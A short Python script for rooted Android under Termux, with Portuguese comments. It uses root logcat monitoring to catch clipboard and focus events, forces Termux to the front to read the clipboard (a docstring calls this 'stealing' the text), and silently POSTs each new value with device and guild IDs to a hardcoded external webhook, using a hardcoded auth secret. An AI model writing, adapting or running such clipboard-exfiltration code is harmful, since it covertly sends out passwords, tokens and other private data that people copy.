import sys
import time
import subprocess
import requests

if len(sys.argv) < 3:
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}

subprocess.run("termux-wake-lock", shell=True, check=False)

def force_focus_and_read():
    """Traz o Termux pra frente, rouba o texto e volta"""
    try:
        # Tenta trazer o Termux para o primeiro plano
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
        time.sleep(0.4) # Pequeno fôlego para o Android liberar o acesso
        
        texto = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        
        # Volta para o app anterior (botão Back)
        subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
        
        return texto if texto and texto != "null" else ""
    except Exception:
        return ""

last_clip = force_focus_and_read()

# Limpa logs e começa a vigiar de forma ampla
# Aqui vigiamos 'Clip' e 'Focus' porque quando você copia no Google, o foco muda brevemente
subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
cmd_vigia = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
process = subprocess.Popen(cmd_vigia, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

print("📡 Vigilante Sensível iniciado...")

while True:
    line = process.stdout.readline()
    
    if line:
        # Se houve sinal de clip ou mudança de foco, tentamos ler
        time.sleep(0.5) 
        current = force_focus_and_read()
        
        if current and current != last_clip:
            try:
                requests.post(URL_WEBHOOK, json={"texto": current, "device_id": device_id, "guild_id": guild_id}, headers=headers, timeout=5)
                last_clip = current
                with open("last_activity.txt", "w") as f: f.write(str(time.time()))
            except:
                pass
                
    if process.poll() is not None:
        process = subprocess.Popen(cmd_vigia, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
